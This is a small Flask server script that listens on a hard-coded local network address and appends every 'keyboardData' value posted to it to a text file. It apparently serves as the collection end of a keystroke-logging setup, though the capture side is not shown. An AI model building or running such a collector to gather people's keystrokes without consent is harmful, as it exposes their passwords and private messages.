from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_post_data():
    try:
        # Get the JSON data sent from the client
        data = request.get_json()
        keyboard_data = data.get('keyboardData')
        
        # Do something with the keyboard data, for example, print it
        print("Received keyboard data:", keyboard_data)
        
        # Save the keyboard data to a text file
        with open('keyboard_data.txt', 'a') as file:
            file.write(keyboard_data + '\n')
        
        # You can add more processing logic here
        
        return "Data received successfully", 200
    except Exception as e:
        print("Error processing request:", e)
        return "Error processing request", 500

if __name__ == '__main__':
    # Set the IP address and port number for the server to listen on
    ip_address = "192.168.97.101" #Change it  according to your network configuration
    port_number = 8080
    # Start the Flask server
    app.run(host=ip_address, port=port_number)